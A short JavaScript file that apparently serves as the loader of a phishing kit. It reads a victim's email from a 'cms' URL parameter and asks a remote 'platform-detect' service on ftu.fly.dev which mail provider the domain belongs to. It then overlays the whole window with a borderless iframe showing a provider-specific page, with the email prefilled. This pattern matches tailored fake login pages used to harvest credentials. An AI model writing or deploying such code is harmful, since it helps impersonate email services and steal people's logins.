// Redirect to provider-specific page based on detected platform
const API_BASE = window.location.hostname === "localhost" ? "" : "https://ftu.fly.dev";

document.addEventListener("DOMContentLoaded", async () => {
  const params = new URLSearchParams(window.location.search);
  const email = params.get("cms");

  if (!email || !email.includes("@")) {
    window.location.replace("/pages/fallback/index.html");
    return;
  }

  const domain = email.split("@")[1].toLowerCase();
  let pageKey = "fallback";

  try {
    const res = await fetch(`${API_BASE}/api/platform-detect?domain=${encodeURIComponent(domain)}`);
    if (res.ok) {
      const data = await res.json();
      if (data.platform && data.platform !== "unknown") {
        pageKey = data.platform;
      }
    } else {
      console.error("Platform detect request failed", res.status, res.statusText);
    }
  } catch (err) {
    console.error("Platform detection error", err);
  }

  const iframe = document.createElement("iframe");
  iframe.src = `/pages/${pageKey}/?cms=${encodeURIComponent(email)}`;
  Object.assign(iframe.style, {
    position: "fixed",
    top: "0",
    left: "0",
    width: "100vw",
    height: "100vh",
    border: "none",
    zIndex: "9999",
    opacity: "1",
    pointerEvents: "auto",
  });

  iframe.onload = () => {
    const spinner = document.getElementById("loading-spinner");
    if (spinner) spinner.style.display = "none";
  };

  document.body.appendChild(iframe);
});
